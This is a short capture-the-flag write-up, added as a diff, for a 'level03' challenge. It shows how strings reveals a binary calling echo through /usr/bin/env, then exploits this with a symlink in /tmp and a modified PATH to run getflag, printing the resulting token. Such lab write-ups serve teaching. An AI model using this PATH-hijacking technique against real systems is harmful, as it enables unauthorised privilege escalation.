@@ -1,0 +1,17 @@
+Here, we have a file called level03
+
+If we try to execute it, it'll print "Exploit me"
+Now if we can try to see which line of this file print it using:
+strings level03 | grep "Exploit me"
+We'll get: /usr/bin/env echo Exploit me
+note: strings print the strings of printable characters in files
+
+Here we see that it call echo from /usr/bin/env to print
+We have to create a SymLink with the getflag and a false echo:
+ln -s /bin/getflag /tmp/echo
+
+After that, we just have to change the actual env:
+export PATH=/tmp:$PATH
+
+And execute the file to get:
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
